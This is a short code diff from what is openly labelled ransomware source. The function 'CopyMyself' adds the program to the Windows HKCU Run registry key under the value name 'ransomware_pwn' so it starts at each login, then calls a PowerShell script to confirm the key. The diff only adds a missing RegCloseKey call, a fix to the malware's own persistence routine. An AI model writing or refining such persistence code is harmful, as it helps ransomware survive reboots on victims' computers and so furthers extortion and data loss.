@@ -123,6 +123,7 @@ void Misc::CopyMyself()
 		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &rkey);
 		// give key a value name
 		RegSetValueEx(rkey, "ransomware_pwn", 0, REG_SZ, (LPBYTE)new_path.c_str(), strlen(new_path.c_str())+1);
+		RegCloseKey(rkey);
 
 		// confirm reg key is thre
 		call_ps("invoke_reg.ps1");
